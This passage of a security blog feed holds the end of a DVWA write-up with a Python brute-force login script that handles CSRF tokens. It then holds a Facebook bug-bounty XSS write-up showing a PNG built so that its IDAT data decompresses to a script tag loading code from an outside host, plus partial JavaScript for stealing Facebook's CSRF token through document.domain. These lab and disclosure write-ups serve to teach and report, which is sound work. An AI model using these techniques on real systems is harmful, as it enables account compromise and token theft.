&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n\n&lt;/span&gt;&lt;span class="s"&gt;[!] url_request: Page didn't response correctly (Response: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;).&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;[i] Quitting.&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;status_code&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;# We have what we need&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Main brute force loop&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;brute_force&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;session_id&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;# Load in wordlists files&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pass_list&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;readlines&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user_list&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="n"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;readlines&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;# Counter&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;# Loop around&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;PASS&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;USER&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;            &lt;span class="n"&gt;USER&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;USER&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;rstrip&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;'&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;            &lt;span class="n"&gt;PASS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;PASS&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;rstrip&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;'&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;            &lt;span class="c"&gt;# Increase counter&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;            &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;            &lt;span class="c"&gt;# Feedback for the user&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;[i] Try &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt; // &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;USER&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;PASS&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;            &lt;span class="c"&gt;# Get CSRF token&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;            &lt;span class="n"&gt;session_id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;user_token&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;csrf_token&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;'/vulnerabilities/brute/'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;PHPSESSID&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;session_id&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;            &lt;span class="c"&gt;# Make request&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;            &lt;span class="n"&gt;attempt&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;url_request&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;USER&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;PASS&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;user_token&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;session_id&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;            &lt;span class="c"&gt;#print attempt&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;            &lt;span class="c"&gt;# Check response&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;success&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;attempt&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;                &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n\n&lt;/span&gt;&lt;span class="s"&gt;[i] Found!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;                &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;[i] Username: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;USER&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;                &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;[i] Password: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PASS&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;False&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Get initial CSRF token&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="n"&gt;session_id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;user_token&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;csrf_token&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;'login.php'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Login to web app&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="n"&gt;dvwa_login&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;session_id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;user_token&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Start brute forcing&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="n"&gt;brute_force&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;session_id&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;hr /&gt;

&lt;a name="Summary"&gt;&lt;/a&gt;
&lt;h2&gt;Summary&lt;/h2&gt;

&lt;p&gt;&lt;img alt="DVWA BruteForce Successful" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-final.png" /&gt;&lt;/p&gt;

&lt;p&gt;This attack is mix between the &lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-low/"&gt;low level&lt;/a&gt; and the &lt;a href="https://blog.g0tmi1k.com/dvwa/login/"&gt;main login screen&lt;/a&gt;. Anti Cross-Site Request Forgery (CSRF) tokens (a value which is random on each request) should not be used for protection against brute force attacks.&lt;/p&gt;</description><pubDate>Mon, 09 Nov 2015 07:32:00 +0000</pubDate></item><item><title>An XSS on Facebook via PNGs &amp; Wonky Content Types</title><link>https://whitton.io/articles/xss-on-facebook-via-png-content-types/</link><description>&lt;p&gt;Content uploaded to Facebook is stored on their &lt;a href="https://en.wikipedia.org/wiki/Content_delivery_network"&gt;CDN&lt;/a&gt;, which is served via various domains (most of which are sub-domains of either &lt;code&gt;akamaihd.net&lt;/code&gt; or &lt;code&gt;fbcdn.net&lt;/code&gt;).&lt;/p&gt;

&lt;p&gt;The &lt;a href="https://www.facebook.com/help/261764017354370"&gt;captioning feature of Videos&lt;/a&gt; also stores the &lt;code&gt;.srt&lt;/code&gt; files on the CDN, and I noticed that right-angle brackets were un-encoded.&lt;/p&gt;

&lt;pre&gt;https://fbcdn-dragon-a.akamaihd.net/hphotos-ak-xaf1/&amp;hellip;.srt&lt;/pre&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/facebookxss/facebook-xss-1-1.png"&gt;
        &lt;img src="https://whitton.io/images/facebookxss/facebook-xss-1-1.png" style="width: 70%;" /&gt;
    &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;I was trying to think of ways to get the file interpreted as HTML. Maybe MIME sniffing (since there’s no &lt;code&gt;&lt;a href="https://www.owasp.org/index.php/List_of_useful_HTTP_headers"&gt;X-Content-Type-Option&lt;/a&gt;&lt;/code&gt; header)?&lt;/p&gt;

&lt;p&gt;It’s actually a bit easier than that. We can just change the extension to &lt;code&gt;.html&lt;/code&gt; (which probably shouldn’t be possible…).&lt;/p&gt;

&lt;pre&gt;https://fbcdn-dragon-a.akamaihd.net/hphotos-ak-xaf1/t39.2093-6/&amp;hellip;.html&lt;/pre&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/facebookxss/facebook-xss-1.png"&gt;
        &lt;img src="https://whitton.io/images/facebookxss/facebook-xss-1.png" style="width: 70%;" /&gt;
    &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;Unfortunately left angles are stripped out (which I later found out was due to &lt;a href="https://twitter.com/phwd"&gt;@phwd&lt;/a&gt;’s very &lt;a href="http://philippeharewood.com/ability-to-upload-html-via-srt-caption-files-for-facebook-videos/"&gt;much related finding&lt;/a&gt;), so there’s not much we can do here. Instead, I looked for other files which could also be loaded as &lt;code&gt;text/html&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;A lot of the photos/videos on Facebook now seem to contain a hash in the URL (parameters &lt;code&gt;oh&lt;/code&gt; and &lt;code&gt;__gda__&lt;/code&gt;), which causes an error to be thrown if we modify the file extension.&lt;/p&gt;

&lt;p&gt;Luckily, advert images don’t contain these parameters.&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/facebookxss/facebook-xss-2.png"&gt;
        &lt;img src="https://whitton.io/images/facebookxss/facebook-xss-2.png" /&gt;
    &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;All that we have to do now is find a way to embed some HTML into an image. The trouble is that &lt;a href="https://en.wikipedia.org/wiki/Exchangeable_image_file_format"&gt;Exif&lt;/a&gt; data is stripped out of JPEGs, and &lt;a href="http://www.libpng.org/pub/png/spec/1.2/PNG-Chunks.html#C.Anc-text"&gt;iTXt chunks&lt;/a&gt; are stripped out of PNGs.&lt;/p&gt;

&lt;p&gt;If we try to blindly insert a string into an image and upload it we receive an error.&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/facebookxss/facebook-xss-3.png"&gt;
        &lt;img src="https://whitton.io/images/facebookxss/facebook-xss-3.png" /&gt;
    &lt;/a&gt;
&lt;/figure&gt;

&lt;h4 id="png-idat-chunks"&gt;PNG IDAT Chunks&lt;/h4&gt;

&lt;p&gt;I started searching for ideas and came across this great blog post: &lt;a href="http://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/" rel="noreferrer"&gt;“Encoding Web Shells in PNG IDAT chunks”&lt;/a&gt;. This section of this bug is made possible due that post, so props to the author.&lt;/p&gt;

&lt;p&gt;The post describes encoding data into the &lt;a href="http://www.w3.org/TR/PNG/#11IDAT"&gt;IDAT&lt;/a&gt; chunk, which ensures it’ll stay there even after the modifications Facebook’s image uploader makes.&lt;/p&gt;

&lt;p&gt;The author kindly provides a &lt;a href="http://www.idontplaydarts.com/images/phppng.png" rel="noreferrer"&gt;proof-of-concept image&lt;/a&gt;, which worked perfectly (the PHP shell obviously won’t execute, but it demonstrates that the data survived uploading).&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/facebookxss/facebook-xss-4.png"&gt;
        &lt;img src="https://whitton.io/images/facebookxss/facebook-xss-4.png" style="width: 70%;" /&gt;
    &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;Now, I could have submitted the bug there and then - we’ve got proof that images can be served with a content type of &lt;code&gt;text/html&lt;/code&gt;, and angle brackets aren’t encoded (which means we can certainly inject HTML).&lt;/p&gt;

&lt;p&gt;But that’s boring, and everyone knows an XSS isn’t an XSS without an alert box.&lt;/p&gt;

&lt;p&gt;The author also provides an &lt;a href="http://www.idontplaydarts.com/images/xsspng.png" rel="noreferrer"&gt;XSS ready PNG&lt;/a&gt;, which I could just upload and be done. But since it references a remote JS file, I wasn’t too keen on the bug showing up in a referer log. Plus I wanted to try myself to create one of these images.&lt;/p&gt;

&lt;p&gt;As mentioned in post, the first step is to craft a string, that when compressed using &lt;a href="https://en.wikipedia.org/wiki/DEFLATE"&gt;DEFLATE&lt;/a&gt;, produces the desired output. Which in this case is:&lt;/p&gt;

&lt;pre&gt;&amp;lt;SCRIPT src=//FNT.PE&amp;gt;&amp;lt;script&amp;gt;&lt;/pre&gt;

&lt;p&gt;Rather than trying to create this by hand, I used a brute-force solution (I’m sure there are &lt;em&gt;much&lt;/em&gt; better ways, but I wanted to whip up a script and leave it running):&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Convert the desired output to hex - &lt;code&gt;3c534352495054205352433d2f2f464e542e50453e3c2f7363726970743e&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Prepend &lt;code&gt;0x00&lt;/code&gt; -&amp;gt; &lt;code&gt;0xff&lt;/code&gt; to the string (one to two times)&lt;/li&gt;
  &lt;li&gt;Append &lt;code&gt;0x00&lt;/code&gt; -&amp;gt; &lt;code&gt;0xff&lt;/code&gt; to the string (one to two times)&lt;/li&gt;
  &lt;li&gt;Attempt to uncompress the string until an error isn’t thrown&lt;/li&gt;
  &lt;li&gt;Check that the result contains our expected string&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The script took a while to run, but it produced the following output:&lt;/p&gt;

&lt;figure class="highlight"&gt;&lt;pre&gt;&lt;code class="language-text"&gt;7ff399281922111510691928276e6e5c1e151e51241f576e69b16375535b6f&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Compressing the above confirms that we get our string back:&lt;/p&gt;

&lt;figure class="highlight"&gt;
    &lt;pre&gt;
fin1te@mbp /tmp » php -r "echo gzdeflate(hex2bin('7ff399281922111510691928276e6e5c1e151e51241f576e69b16375535b6f')) . PHP_EOL;"
??&amp;lt;SCRIPT SRC=//FNT.PE&amp;gt;&amp;lt;/script&amp;gt;
    &lt;/pre&gt;
&lt;/figure&gt;

&lt;p&gt;Combining the result, with the PHP code for reversing PNG filters and generating the image, gives us the following:&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/facebookxss/xss-fnt-pe-png.png"&gt;
        &lt;img src="https://whitton.io/images/facebookxss/xss-fnt-pe-png.png" style="width: 40%;" /&gt;
    &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;Which, when dumped, shows our payload:&lt;/p&gt;

&lt;figure class="highlight"&gt;
    &lt;pre&gt;
fin1te@mbp /tmp » hexdump -C xss-fnt-pe-png.png
00000000  89 50 4e 47 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  |.PNG........IHDR|
00000010  00 00 00 20 00 00 00 20  08 02 00 00 00 fc 18 ed  |... ... ........|
00000020  a3 00 00 00 09 70 48 59  73 00 00 0e c4 00 00 0e  |.....pHYs.......|
00000030  c4 01 95 2b 0e 1b 00 00  00 65 49 44 41 54 48 89  |...+.....eIDATH.|
00000040  63 ac ff &lt;strong&gt;3c 53 43 52 49  50 54 20 53 52 43 3d 2f&lt;/strong&gt;  |c..&lt;strong&gt;&amp;lt;SCRIPT SRC=/&lt;/strong&gt;|
00000050  &lt;strong&gt;2f 46 4e 54 2e 50 45 3e  3c 2f 73 63 72 69 70 74&lt;/strong&gt;  |&lt;strong&gt;/FNT.PE&amp;gt;&amp;lt;/script&lt;/strong&gt;|
00000060  &lt;strong&gt;3e&lt;/strong&gt; c3 ea c0 46 8d 17 f3  af de 3d 73 d3 fd 15 cb  |&lt;strong&gt;&amp;gt;&lt;/strong&gt;...F.....=s....|
00000070  43 2f 0f b5 ab a7 af ca  7e 7d 2d ea e2 90 22 ae  |C/......~}-...".|
00000080  73 85 45 60 7a 90 d1 8c  3f 0c a3 60 14 8c 82 51  |s.E`z...?..`...Q|
00000090  30 0a 46 c1 28 18 05 a3  60 14 8c 82 61 00 00 78  |0.F.(...`...a..x|
000000a0  32 1c 02 78 65 1f 48 00  00 00 00 49 45 4e 44 ae  |2..xe.H....IEND.|
000000b0  42 60 82                                          |B`.|
    &lt;/pre&gt;
&lt;/figure&gt;

&lt;p&gt;We can then upload it to our advertiser library, and browse to it (with an extension of &lt;code&gt;.html&lt;/code&gt;).&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/facebookxss/facebook-xss-5.png"&gt;
        &lt;img src="https://whitton.io/images/facebookxss/facebook-xss-5.png" style="width: 70%;" /&gt;
    &lt;/a&gt;
&lt;/figure&gt;

&lt;h4 id="bypassing-link-shim"&gt;Bypassing Link Shim&lt;/h4&gt;

&lt;p&gt;What can you do with an XSS on a CDN domain? Not a lot.&lt;/p&gt;

&lt;p&gt;All I could come up with is a LinkShim bypass. &lt;a href="https://www.facebook.com/notes/facebook-security/link-shim-protecting-the-people-who-use-facebook-from-malicious-urls/10150492832835766"&gt;LinkShim&lt;/a&gt; is script/tool which all external links on Facebook are forced through. This then checks for malicious content.&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/facebookxss/facebook-xss-6.png"&gt;
        &lt;img src="https://whitton.io/images/facebookxss/facebook-xss-6.png" /&gt;
    &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;CDN URL’s however &lt;em&gt;aren’t&lt;/em&gt; Link Shim’d, so we can use this as a bypass.&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/facebookxss/facebook-xss-7.png"&gt;
        &lt;img src="https://whitton.io/images/facebookxss/facebook-xss-7.png" /&gt;
    &lt;/a&gt;
&lt;/figure&gt;

&lt;h4 id="moving-from-the-akamai-cdn-hostname-to-facebookcom"&gt;Moving from the Akamai CDN hostname to *.facebook.com&lt;/h4&gt;

&lt;p&gt;Redirects are pretty boring. So I thought I’d check to see if any &lt;code&gt;*.facebook.com&lt;/code&gt; DNS entries were pointing to the CDN.&lt;/p&gt;

&lt;p&gt;I found &lt;code&gt;photo.facebook.com&lt;/code&gt; (I forgot to screenshot the output of &lt;code&gt;dig&lt;/code&gt; before the patch, so here’s an entry from Google’s cache):&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/facebookxss/facebook-xss-8.png"&gt;
        &lt;img src="https://whitton.io/images/facebookxss/facebook-xss-8.png" /&gt;
    &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;Browsing to this host with our image as the path loads a JavaScript file from &lt;a href="https://fnt.pe"&gt;fnt.pe&lt;/a&gt;, which then displays an alert box with the hostname.&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/facebookxss/facebook-xss-9.png"&gt;
        &lt;img src="https://whitton.io/images/facebookxss/facebook-xss-9.png" /&gt;
    &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;Any session cookies are marked as &lt;a href="https://en.wikipedia.org/wiki/HTTP_cookie#HttpOnly_cookie"&gt;HTTPOnly&lt;/a&gt;, and we can’t make requests to &lt;code&gt;www.facebook.com&lt;/code&gt;. What do we do other than popping an alert box?&lt;/p&gt;

&lt;h4 id="enter-documentdomain"&gt;Enter &lt;code&gt;document.domain&lt;/code&gt;&lt;/h4&gt;

&lt;p&gt;It’s possible for two pages from a different origin, but sharing the same parent domain, to interact with each other, providing they both set the &lt;code&gt;&lt;a href="https://developer.mozilla.org/en-US/docs/Web/API/Document/domain"&gt;document.domain&lt;/a&gt;&lt;/code&gt; property to the parent domain.&lt;/p&gt;

&lt;p&gt;We can easily do this for our page, since we can run arbitrary JavaScript. But we also need to find a page on &lt;code&gt;www.facebook.com&lt;/code&gt; which does the same, and doesn’t have an &lt;code&gt;&lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options"&gt;X-Frame-Options&lt;/a&gt;&lt;/code&gt; header set to &lt;code&gt;DENY&lt;/code&gt; or &lt;code&gt;SAMEORIGIN&lt;/code&gt; (we’re still cross-origin at this point).&lt;/p&gt;

&lt;p&gt;This wasn’t too difficult to find - Facebook has various plugins which are meant to be placed inside an &lt;code&gt;&amp;lt;iframe&amp;gt;&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;We can use the &lt;a href="https://developers.facebook.com/docs/plugins/page-plugin"&gt;Page Plugin&lt;/a&gt;. It sets the &lt;code&gt;document.domain&lt;/code&gt; property, and also contains &lt;code&gt;fb_dtsg&lt;/code&gt; (the CSRF token Facebook uses).&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/facebookxss/facebook-xss-10.png"&gt;
        &lt;img src="https://whitton.io/images/facebookxss/facebook-xss-10.png" /&gt;
    &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;What we now need to do is load the plugin inside an iframe, wait for the &lt;code&gt;onload&lt;/code&gt; event to fire, and extract the token from the content.&lt;/p&gt;

&lt;figure class="highlight"&gt;&lt;pre&gt;&lt;code class="language-js"&gt;&lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;domain&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;facebook.com&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;createElement&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;iframe&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setAttribute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;id&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;i&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
